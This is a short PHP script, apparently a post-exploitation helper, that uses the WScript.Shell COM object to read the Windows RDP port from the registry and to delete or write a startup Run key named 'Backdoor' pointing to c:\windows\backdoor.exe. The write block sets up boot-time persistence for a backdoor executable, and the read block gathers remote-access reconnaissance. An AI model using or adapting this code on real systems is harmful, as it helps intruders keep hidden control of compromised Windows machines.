<?php

/*************************************

Windows registry read

*************************************/

// KEY
$regkey = 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber';

$shell = new COM('WScript.Shell');

var_dump($shell->RegRead($regkey));




/*************************************

Windows registry delete

*************************************/

// KEY
$regkey = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor';

$shell= new COM('WScript.Shell');

echo 'Delete registry '.(!$shell->RegDelete($regkey) ? 'success' : 'failed');




/*************************************

Windows registry write

*************************************/

// KEY
$regkey = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor';

$regtype = 'REG_SZ';

// VALUE
$regval = 'c:\windows\backdoor.exe';

$shell= new COM('WScript.Shell');

$a = $shell->RegWrite($regkey, $regval, $regtype);

echo 'Write registry '.(!$a ? 'success' : 'failed');
